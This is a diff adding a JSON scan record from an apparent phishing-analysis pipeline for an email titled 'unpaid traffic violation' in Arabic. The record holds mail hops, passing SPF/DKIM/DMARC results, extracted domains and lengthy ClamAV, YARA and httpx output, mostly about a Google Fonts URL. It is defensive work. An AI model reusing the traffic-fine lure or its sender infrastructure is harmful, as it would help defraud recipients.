@@ -1,0 +1,3348 @@
+{
+  "id": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+  "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+  "timestamp": "2026-04-11T13:28:46.645430",
+  "from": "support@critical.click",
+  "to": "mohamed.samir@dphish.com",
+  "subject": "مخالفة مرورية غير مدفوعة",
+  "summary": {
+    "message_id": "<177573782286.2712741.6680641267250891682@localhost>",
+    "created_at": "Thu, 09 Apr 2026 12:30:22 -0000",
+    "from": {
+      "name": "Support",
+      "email": "support@critical.click"
+    },
+    "to": [
+      "mohamed.samir@dphish.com"
+    ],
+    "subject": "مخالفة مرورية غير مدفوعة",
+    "spf": "pass",
+    "dkim": "pass",
+    "dmarc": "pass"
+  },
+  "hops": [
+    {
+      "number": "1",
+      "delay": "",
+      "from": "localhost",
+      "to": "mail.alexandriadigital.digital",
+      "protocol": "ESMTPSA id 4frzmH0kl8z56WH for <mohamed.samir@dphish.com>",
+      "time_received": "Thu, 9 Apr 2026 12:30:22 +0000 (UTC)"
+    },
+    {
+      "number": "2",
+      "delay": "",
+      "from": "mail.alexandriadigital.digital",
+      "to": "mail.bluesword.live",
+      "protocol": "ESMTP id BtMc73jQUvEH for <mohamed.samir@dphish.com>",
+      "time_received": "Thu, 9 Apr 2026 12:30:23 +0000 (UTC)"
+    },
+    {
+      "number": "3",
+      "delay": "",
+      "from": "mail.bluesword.live",
+      "to": "mail.alexandriadigital.digital",
+      "protocol": "ESMTP id 4frzmH4bGYz59kv for <mohamed.samir@dphish.com>",
+      "time_received": "Thu, 9 Apr 2026 12:30:23 +0000 (UTC)"
+    },
+    {
+      "number": "4",
+      "delay": "",
+      "from": "mail.alexandriadigital.digital",
+      "to": "DB5PEPF00014B8F.mail.protection.outlook.com",
+      "protocol": "Microsoft SMTP Server",
+      "time_received": "Thu, 9 Apr 2026 12:30:24 +0000"
+    },
+    {
+      "number": "5",
+      "delay": "0 ms",
+      "from": "DB5PEPF00014B8F.eurprd02.prod.outlook.com",
+      "to": "DU2PR04CA0025.outlook.office365.com",
+      "protocol": "Microsoft SMTP Server",
+      "time_received": "Thu, 9 Apr 2026 12:30:24 +0000"
+    },
+    {
+      "number": "6",
+      "delay": "0 ms",
+      "from": "DU2PR04CA0025.eurprd04.prod.outlook.com",
+      "to": "DBBP194MB1020.EURP194.PROD.OUTLOOK.COM",
+      "protocol": "Microsoft SMTP Server",
+      "time_received": "Thu, 9 Apr 2026 12:30:24 +0000"
+    },
+    {
+      "number": "7",
+      "delay": "1 sec",
+      "from": "DBBP194MB1020.EURP194.PROD.OUTLOOK.COM",
+      "to": "DB8P194MB0824.EURP194.PROD.OUTLOOK.COM",
+      "protocol": "HTTPS",
+      "time_received": "Thu, 9 Apr 2026 12:30:25 +0000"
+    }
+  ],
+  "ips": [],
+  "domains": [
+    {
+      "type": "domain",
+      "parent": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+      "parent_type": "email",
+      "size": 10,
+      "sha256": "1a2e36cc692d119df0a1849e97aafb00564af3f638bb5fbe4c63be1cb6b82319",
+      "domain": "www.w3.org"
+    },
+    {
+      "type": "domain",
+      "parent": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+      "parent_type": "email",
+      "size": 20,
+      "sha256": "2d0f3c337e640d3ae1e7aafbde887dfed9b6078e97fd5f609f27ed528032d893",
+      "domain": "fonts.googleapis.com"
+    },
+    {
+      "type": "domain",
+      "parent": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+      "parent_type": "email",
+      "size": 18,
+      "sha256": "713de8b0719424aa662f49d55bb1817c7fb45b3697633d29036985df779d4f42",
+      "domain": "demoksa.mickey.fit"
+    }
+  ],
+  "urls": [
+    {
+      "type": "url",
+      "parent": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+      "parent_type": "email",
+      "size": 62,
+      "sha256": "002c502f60cd469ce87688dcddb4413c90c1abd95aa90f9e40d2f8fe610c1939",
+      "url": "https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700",
+      "analysis": {
+        "artifact_type": "urls",
+        "artifact_name": "https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700",
+        "root_event": {
+          "file": {
+            "depth": 0,
+            "flavors": {
+              "mime": [
+                "text/plain"
+              ],
+              "yara": []
+            },
+            "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___urls___1",
+            "scanners": [
+              "ScanClamav",
+              "ScanEntropy",
+              "ScanFooter",
+              "ScanHash",
+              "ScanHeader",
+              "ScanTlsh",
+              "ScanUrl",
+              "ScanYara",
+              "HttpxScanner"
+            ],
+            "size": 62,
+            "source": "",
+            "tree": {
+              "node": "3f673c2b-25e9-483b-a5a0-fcb7e5882004",
+              "parent": "",
+              "root": "3f673c2b-25e9-483b-a5a0-fcb7e5882004"
+            }
+          },
+          "scan": {
+            "clamav": {
+              "elapsed": 20.829649,
+              "flags": [],
+              "Known viruses": "3627833",
+              "Engine version": "1.4.3",
+              "Scanned directories": "0",
+              "Scanned files": "1",
+              "Infected files": "0",
+              "Data scanned": "0.00 MB",
+              "Data read": "0.00 MB (ratio 0.00",
+              "Time": "20.790 sec (0 m 20 s)",
+              "Start Date": "2026",
+              "End Date": "2026"
+            },
+            "entropy": {
+              "elapsed": 0.000081,
+              "flags": [],
+              "entropy": 4.581302429049666
+            },
+            "footer": {
+              "elapsed": 0.000044,
+              "flags": [],
+              "footer": {
+                "_type": "bytes",
+                "encoding": "base64",
+                "data": "cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVVidW50dTozMDAsNDAwLDUwMCw3MDA="
+              },
+              "backslash": "s.googleapis.com/css?family=Ubuntu:300,400,500,700"
+            },
+            "hash": {
+              "elapsed": 0.000151,
+              "flags": [],
+              "md5": "646943ae8e896da61dc59a31360d3598",
+              "sha1": "f3c5bf3866bd7012b68e31dacb8a60384dd7c5a9",
+              "sha256": "002c502f60cd469ce87688dcddb4413c90c1abd95aa90f9e40d2f8fe610c1939",
+              "ssdeep": "3:N8G6hmHRWWaDaSduKuVj8mV:2IHRSakuKaoi",
+              "tlsh": "T181A00267111C94811A1159C2B3B0BA1E5827146E3D846294683594A8A0E41991548545"
+            },
+            "header": {
+              "elapsed": 0.000032,
+              "flags": [],
+              "header": {
+                "_type": "bytes",
+                "encoding": "base64",
+                "data": "aHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVVidW50dTozMDA="
+              },
+              "backslash": "https://fonts.googleapis.com/css?family=Ubuntu:300"
+            },
+            "tlsh": {
+              "elapsed": 0.000057,
+              "flags": []
+            },
+            "url": {
+              "elapsed": 0.000106,
+              "flags": [],
+              "urls": [
+                "https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700"
+              ]
+            },
+            "yara": {
+              "elapsed": 0.001978,
+              "flags": [],
+              "rules_loaded": 2681,
+              "matches": [
+                "url",
+                "domain"
+              ],
+              "tags": [],
+              "meta": [],
+              "hex": [],
+              "collection": [],
+              "detection": [],
+              "information": []
+            },
+            "httpxner": {
+              "elapsed": 4.714036,
+              "flags": [],
+              "httpx": [
+                {
+                  "source_type": "external",
+                  "parent_file_id": "0dea844e-f153-4c13-8486-46e6a215f08d",
+                  "parent_file_name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___urls___1",
+                  "input_url": "https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700",
+                  "certificates": [
+                    {
+                      "subject": "CN=upload.video.google.com",
+                      "issuer": "CN=WE2, O=Google Trust Services, C=US",
+                      "validFrom": "2026-03-23T08:38:52Z",
+                      "validTo": "2026-06-15T08:38:51Z",
+                      "serialNumber": "A3:FE:66:36:8B:92:41:EE:09:0B:DB:A7:10:F4:B0:8A"
+                    }
+                  ],
+                  "page": {
+                    "url": "https://fonts.googleapis.com/css?family=Ubuntu:300",
+                    "domain": "142.251.127.95",
+                    "ip": "142.251.127.95",
+                    "asn": null,
+                    "asnname": null,
+                    "ptr": null,
+                    "server": "ESF",
+                    "tlsIssuer": "WE2",
+                    "tlsValidFrom": "2026-03-23T08:38:52Z",
+                    "tlsValidTo": "2026-06-15T08:38:51Z",
+                    "title": null
+                  },
+                  "final_url": null,
+                  "status_code": 200,
+                  "redirects": [],
+                  "redirect_chain_details": [],
+                  "raw_httpx_output": "/tmp/httpx_tmp/run_20260411_132944_006636/httpx_output.jsonl",
+                  "httpx_run_directory": "/tmp/httpx_tmp/run_20260411_132944_006636",
+                  "downloaded_body_sha256": "fa9d903fa21ede93ae8de46c976fff38f0bfcb415b32ba3b300d34c653f2db13",
+                  "downloaded_body_emitted": true,
+                  "downloaded_body_filename": "142.251.127.95.css",
+                  "screenshot_sha256": "af36ac71c82cdd7cd08f098059c4e6e5e7e7b27b7bf64af235c73575f758f780",
+                  "screenshot_emitted": true,
+                  "screenshot_filename": "142.251.127.95_screenshot.png"
+                }
+              ]
+            }
+          },
+          "iocs": []
+        },
+        "events": [
+          {
+            "file": {
+              "depth": 1,
+              "flavors": {
+                "mime": [
+                  "text/plain"
+                ],
+                "yara": []
+              },
+              "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files",
+              "scanners": [
+                "ScanClamav",
+                "ScanEntropy",
+                "ScanFooter",
+                "ScanHash",
+                "ScanHeader",
+                "ScanTlsh",
+                "ScanUrl",
+                "ScanYara",
+                "HttpxScanner"
+              ],
+              "size": 1971,
+              "source": "HttpxScanner",
+              "tree": {
+                "node": "99f3a200-b347-4d45-80a2-596b6beaa0f6",
+                "parent": "3f673c2b-25e9-483b-a5a0-fcb7e5882004",
+                "root": "3f673c2b-25e9-483b-a5a0-fcb7e5882004"
+              }
+            },
+            "scan": {
+              "clamav": {
+                "elapsed": 22.642503,
+                "flags": [],
+                "Known viruses": "3627833",
+                "Engine version": "1.4.3",
+                "Scanned directories": "0",
+                "Scanned files": "1",
+                "Infected files": "0",
+                "Data scanned": "0.00 MB",
+                "Data read": "0.00 MB (ratio 0.00",
+                "Time": "22.600 sec (0 m 22 s)",
+                "Start Date": "2026",
+                "End Date": "2026"
+              },
+              "entropy": {
+                "elapsed": 0.000084,
+                "flags": [],
+                "entropy": 5.521574222658879
+              },
+              "footer": {
+                "elapsed": 0.000041,
+                "flags": [],
+                "footer": {
+                  "_type": "bytes",
+                  "encoding": "base64",
+                  "data": "aHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVVidW50dTozMDA="
+                },
+                "backslash": "https://fonts.googleapis.com/css?family=Ubuntu:300"
+              },
+              "hash": {
+                "elapsed": 0.00019,
+                "flags": [],
+                "md5": "bf0e6be8c472a9a314e763ef877cf11a",
+                "sha1": "1f571feb5131bb5f812fb32b58cb8771af12e97a",
+                "sha256": "fa9d903fa21ede93ae8de46c976fff38f0bfcb415b32ba3b300d34c653f2db13",
+                "ssdeep": "48:UOWxbOWbFZUOWbOW5VOWGJc+uoOW3kN0xEYm:UOWxbOWbFZUOWbOW5VOWGJc+uoOWUN9z",
+                "tlsh": "T156419EA3142E940467930CC223DBBE358E8F21896045C5AABFFD18D49CE2D3A137679E"
+              },
+              "header": {
+                "elapsed": 0.000035,
+                "flags": [],
+                "header": {
+                  "_type": "bytes",
+                  "encoding": "base64",
+                  "data": "NzcyDQovKiBjeXJpbGxpYy1leHQgKi8KQGZvbnQtZmFjZSB7CiAgZm9udC1mYW1pbHk="
+                },
+                "backslash": "772\\r\\n/* cyrillic-ext */\\n@font-face {\\n  font-family"
+              },
+              "tlsh": {
+                "elapsed": 0.000073,
+                "flags": []
+              },
+              "url": {
+                "elapsed": 0.000528,
+                "flags": [],
+                "urls": [
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvmyNPYZvg7UI.woff2",
+                  "https://fonts.googleapis.com/css?family=Ubuntu:300",
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvGyNPYZvg7UI.woff2",
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvWyNPYZvg7UI.woff2",
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1Czjs2yNPYZvg7UI.woff2",
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjsGyNPYZvgw.woff2",
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjtGyNPYZvg7UI.woff2"
+                ]
+              },
+              "yara": {
+                "elapsed": 0.003137,
+                "flags": [],
+                "rules_loaded": 2681,
+                "matches": [
+                  "url",
+                  "domain"
+                ],
+                "tags": [],
+                "meta": [],
+                "hex": [],
+                "collection": [],
+                "detection": [],
+                "information": []
+              },
+              "httpxner": {
+                "elapsed": 93.738318,
+                "flags": [
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error"
+                ],
+                "httpx": [
+                  {
+                    "source_type": "external",
+                    "parent_file_id": "99f3a200-b347-4d45-80a2-596b6beaa0f6",
+                    "parent_file_name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files",
+                    "input_url": "https://fonts.googleapis.com/css?family=Ubuntu:300",
+                    "certificates": [
+                      {
+                        "subject": "CN=upload.video.google.com",
+                        "issuer": "CN=WE2, O=Google Trust Services, C=US",
+                        "validFrom": "2026-03-23T08:38:52Z",
+                        "validTo": "2026-06-15T08:38:51Z",
+                        "serialNumber": "A3:FE:66:36:8B:92:41:EE:09:0B:DB:A7:10:F4:B0:8A"
+                      }
+                    ],
+                    "page": {
+                      "url": "https://fonts.googleapis.com/css?family=Ubuntu:300",
+                      "domain": "142.250.154.95",
+                      "ip": "142.250.154.95",
+                      "asn": null,
+                      "asnname": null,
+                      "ptr": null,
+                      "server": "ESF",
+                      "tlsIssuer": "WE2",
+                      "tlsValidFrom": "2026-03-23T08:38:52Z",
+                      "tlsValidTo": "2026-06-15T08:38:51Z",
+                      "title": null
+                    },
+                    "final_url": null,
+                    "status_code": 200,
+                    "redirects": [],
+                    "redirect_chain_details": [],
+                    "raw_httpx_output": "/tmp/httpx_tmp/run_20260411_133141_161314/httpx_output.jsonl",
+                    "httpx_run_directory": "/tmp/httpx_tmp/run_20260411_133141_161314",
+                    "downloaded_body_sha256": "fa9d903fa21ede93ae8de46c976fff38f0bfcb415b32ba3b300d34c653f2db13",
+                    "downloaded_body_emitted": true,
+                    "downloaded_body_filename": "142.250.154.95.css",
+                    "screenshot_sha256": "af36ac71c82cdd7cd08f098059c4e6e5e7e7b27b7bf64af235c73575f758f780",
+                    "screenshot_emitted": true,
+                    "screenshot_filename": "142.250.154.95_screenshot.png"
+                  }
+                ],
+                "errors": [
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "772",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133011_389297/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "/* cyrillic-ext */",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133013_828782/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "@font-face {",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133016_546726/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-family: 'Ubuntu';",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133018_978368/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-style: normal;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133021_702753/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-weight: 300;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133024_502471/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvWyNPYZvg7UI.woff2) format('woff2');",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133026_893977/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133029_390998/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "}",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133031_594709/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "/* cyrillic */",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133034_059844/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "@font-face {",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133036_483618/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-family: 'Ubuntu';",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133038_654906/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-style: normal;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133040_357593/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-weight: 300;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133042_398032/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjtGyNPYZvg7UI.woff2) format('woff2');",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133044_006342/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133045_668326/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "}",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133047_374034/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "/* greek-ext */",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133048_970481/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "@font-face {",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133050_663955/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-family: 'Ubuntu';",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133052_494473/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-style: normal;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133054_491976/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-weight: 300;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133056_137619/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvGyNPYZvg7UI.woff2) format('woff2');",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133057_815306/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "unicode-range: U+1F00-1FFF;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133059_457955/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "}",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133101_216665/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "/* greek */",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133102_886160/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "@font-face {",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133104_537888/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-family: 'Ubuntu';",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133106_215960/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-style: normal;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133107_677416/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-weight: 300;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133109_072995/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1Czjs2yNPYZvg7UI.woff2) format('woff2');",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133110_497720/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133112_213366/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "}",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133113_865307/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "/* latin-ext */",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133115_404012/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "@font-face {",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133116_998207/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-family: 'Ubuntu';",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133118_516960/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-style: normal;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133120_202797/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-weight: 300;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133121_686299/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvmyNPYZvg7UI.woff2) format('woff2');",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133123_219685/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133124_669969/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "}",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133126_192764/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "/* latin */",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133127_682639/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "@font-face {",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133129_361550/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-family: 'Ubuntu';",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133130_990377/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-style: normal;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133132_397612/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "font-weight: 300;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133134_088765/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjsGyNPYZvgw.woff2) format('woff2');",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133135_490322/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133136_958075/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "}",
